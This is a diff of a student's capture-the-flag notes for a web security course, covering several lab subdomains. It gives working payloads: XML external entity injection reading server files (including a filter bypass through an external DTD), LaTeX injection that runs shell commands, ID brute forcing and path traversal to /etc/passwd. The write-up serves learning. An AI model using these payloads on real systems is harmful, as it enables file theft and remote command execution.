@@ -390,7 +390,9 @@ pay-portal subdomain
 
 support subdomain
 
-​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+- Noticed new notes had the format of /raw/{base58encode(customer_id:ticket_id)}
+  - Python brute force: flag found at 1125:4
+  - Another flag found at 9447:1
 
 bigapp subdomain
 
@@ -433,6 +435,80 @@ signin subdomain
 - Reset -> enter email to get password
 - Login -> makes a request to qdns subdomain
 - Navigate to qdns subdomain
+
+v1.feedifier subdomain
+
+- Source code: flag hidden in /flag_1e023d780b687b2b3be9b3a5b65a4a23
+- Navigating to this returns error 404 - most likely file to be accessed on server
+- GitHub Gist to host malicious xml file - modify existing RSS template such as https://blog.quoccabank.com/?feed=rss2
+  - Add `<!DOCTYPE foo [<!ELEMENT foo ANY> <!ENTITY xxe SYSTEM "file:///flag_1e023d780b687b2b3be9b3a5b65a4a23">]>`
+  - Overwrite one of the link fields for a RSS item with `&xxe;` - other fields have output length limited
+  - The link will now be the flag
+
+v2.feedifier subdomain
+
+- Using the same method for the new flag location (from source code) returns an error: bad word detected
+
+- From experimenting, this bad word is `file://`
+
+- Can't concatenate XML entities or use `&#47;` instead of a `/`, or use different encodings -> potentially load another XXE entity
+
+- Main xml:
+
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [<!ENTITY % load SYSTEM "external dtd (different from current domain)"> %l;]>
+  <rss version="2.0">
+  <channel>
+    <item>
+    	<title>&payload;</title>
+      <link>&payload;</link>
+    	<description>&payload;</description>
+    </item>
+  </channel>
+  </rss>
+  ```
+
+- External dtd:
+
+  ```xml-dtd
+  <!ENTITY payload SYSTEM "file:///flag_ef06b68429bb6010ab389ebbe34cb757">
+  ```
+
+v3.feedifier subdomain
+
+
+
+v4.feedifier subdomain
+
+
+
+letters subdomain
+
+- Flag 1
+  - LaTex to PDF /flag file in source code
+  - inject LaTeX: `\input{/flag}` to open /flag file to get flag
+- Flag 2
+  - /key file in source code: similar approach as above to get the key: imagineUsingW0rd
+  - key signs the debug option
+  - Payload: `\input{|"ls / | base64"}`
+  - then `\input{|"cat /admin_539f98bf-9a52-4bc0-bf34-1ffaba10997c.pdf | base64"}`
+  - then reading the base64 decoded bytes as a pdf to get the flag  [Hacking with LaTeX](https://0day.work/hacking-with-latex/)
+
+bfd subdomain
+
+- https://github.com/ajyoon/systemf/blob/master/examples/http/server.bf#L241 mentions treating the address as a relative file path
+- Intercept GET request with Burp Suite, make request to `/../../../../etc/passwd` or `//etc/passwd` to get the flag COMP6443{BRAAAAAINS}
+
+gcc subdomain
+
+
+
+
+
+
+
+
 
 
 
